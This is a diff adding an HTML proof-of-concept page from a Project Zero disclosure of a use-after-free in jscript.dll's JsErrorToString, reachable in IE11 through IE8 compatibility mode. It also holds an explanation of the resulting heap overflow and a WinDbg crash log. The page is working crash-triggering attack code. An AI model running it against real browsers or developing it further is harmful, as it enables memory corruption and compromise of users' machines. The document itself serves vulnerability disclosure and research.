@@ -1,0 +1,112 @@
+<!--
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1340
+
+There is a use-after-free in jscript.dll library that can be exploited in IE11.
+
+jscript.dll is an old JavaScript library that was used in IE 8 and back. However, IE11 can still load it if put into IE8 compatibility mode and if there is a script tag that can only be understood by the older library (specifically, a script tag with language="Jscript.Encode" attribute will do the trick).
+
+PoC:
+
+=========================================
+-->
+
+<!-- saved from url=(0014)about:internet -->
+<html>
+<head>
+<meta http-equiv="X-UA-Compatible" content="IE=8"></meta>
+</head>
+<body>
+<script language="Jscript.Encode">
+
+var e = new Error();
+
+var o = {toString:function() {
+  //alert('in toString');
+  e.name = 1;
+  CollectGarbage();
+
+  //reallocate
+  for(var i=0;i<100;i++) {
+    e.name = {};
+  }
+
+  return 'b';
+}};
+
+e.name = Array(1000).join('a');
+e.message = o;
+//alert('calling JsErrorToString');
+var result = e.toString();
+//alert('boom');
+alert(result);
+
+</script>
+</body>
+</html>
+
+<!--
+=========================================
+
+This is a use-after-free in jscript!JsErrorToString that can lead to a heap overflow. (The PoC above crashes in memcpy when attempting to copy a large amount of data).
+
+When JsErrorToString runs, it tries to concatenate “name” and “message” properties of an Error object into an AString object (AString is a string type that is implemented as a list of simpler string parts). First the function converts both “name” and “message” properties to strings using the ConvertToString function, however the second call to ConvertToString can trigger a callback (via toString) and delete the “name” string.
+
+Later, when AString is converted to the BString in AString::ConvertToBSTR, the size of the result BString could be calculated incorrectly which can lead to a heap overflow.
+
+Debug log:
+
+=========================================
+
+(10b8.1364): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+eax=00000003 ebx=00000006 ecx=dcbabbb8 edx=00000003 esi=e6e8bb7f edi=e900fb9b
+eip=751c9a6c esp=09dfbdfc ebp=09dfbe04 iopl=0         nv up ei ng nz na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010286
+msvcrt!memcpy+0x270:
+751c9a6c 8a4603          mov     al,byte ptr [esi+3]        ds:002b:e6e8bb82=??
+
+0:008> k
+ # ChildEBP RetAddr  
+00 09dfbe04 7013c367 msvcrt!memcpy+0x270
+01 09dfbe28 7013c3df jscript!AString::ConvertToBSTR+0x86
+02 09dfbe30 7013eeff jscript!VAR::ConvertASTRtoBSTR+0x13
+03 09dfbe6c 7013af84 jscript!InvokeDispatch+0x424
+04 09dfbf38 7013aefe jscript!InvokeDispatchEx+0x7a
+05 09dfbf68 701244a7 jscript!VAR::InvokeByDispID+0x90
+06 09dfc360 701248ff jscript!CScriptRuntime::Run+0x12b9
+07 09dfc45c 70124783 jscript!ScrFncObj::CallWithFrameOnStack+0x15f
+08 09dfc4b4 70124cc3 jscript!ScrFncObj::Call+0x7b
+09 09dfc558 70133797 jscript!CSession::Execute+0x23d
+0a 09dfc5a0 70135353 jscript!COleScript::ExecutePendingScripts+0x16b
+0b 09dfc61c 70135139 jscript!COleScript::ParseScriptTextCore+0x206
+0c 09dfc648 6bcecf1c jscript!COleScript::ParseScriptText+0x29
+0d 09dfc680 6bced6da MSHTML!CActiveScriptHolder::ParseScriptText+0x51
+0e 09dfc6f0 6ba5f185 MSHTML!CScriptCollection::ParseScriptText+0x1c6
+0f 09dfc7dc 6ba5ecf7 MSHTML!CScriptData::CommitCode+0x31e
+10 09dfc85c 6ba5f8bd MSHTML!CScriptData::Execute+0x232
+11 09dfc87c 6bced030 MSHTML!CHtmScriptParseCtx::Execute+0xed
+12 09dfc8d0 6bcf8265 MSHTML!CHtmParseBase::Execute+0x201
+13 09dfc8ec 6b76388c MSHTML!CHtmPost::Broadcast+0x18e
+14 09dfca24 6b894a9d MSHTML!CHtmPost::Exec+0x617
+15 09dfca44 6b894a03 MSHTML!CHtmPost::Run+0x3d
+16 09dfca60 6b89c1e5 MSHTML!PostManExecute+0x61
+17 09dfca74 6b89d578 MSHTML!PostManResume+0x7b
+18 09dfcaa4 6b796dbc MSHTML!CHtmPost::OnDwnChanCallback+0x38
+19 09dfcabc 6b6d5b90 MSHTML!CDwnChan::OnMethodCall+0x2f
+1a 09dfcb0c 6b6d577a MSHTML!GlobalWndOnMethodCall+0x16c
+1b 09dfcb60 760f62fa MSHTML!GlobalWndProc+0x103
+1c 09dfcb8c 760f6d3a user32!InternalCallWinProc+0x23
+1d 09dfcc04 760f77c4 user32!UserCallWinProcCheckWow+0x109
+1e 09dfcc64 760f788a user32!DispatchMessageWorker+0x3b5
+1f 09dfcc74 6cada8ec user32!DispatchMessageW+0xf
+20 09dffe40 6cb056d8 IEFRAME!CTabWindow::_TabWindowThreadProc+0x464
+21 09dfff00 76ab2f5c IEFRAME!LCIETab_ThreadProc+0x3e7
+22 09dfff18 74693a31 iertutil!CMemBlockRegistrar::_LoadProcs+0x67
+23 09dfff50 7667336a IEShims!NS_CreateThread::DesktopIE_ThreadProc+0x94
+24 09dfff5c 77379902 kernel32!BaseThreadInitThunk+0xe
+25 09dfff9c 773798d5 ntdll!__RtlUserThreadStart+0x70
+26 09dfffb4 00000000 ntdll!_RtlUserThreadStart+0x1b
+
+=========================================
+-->
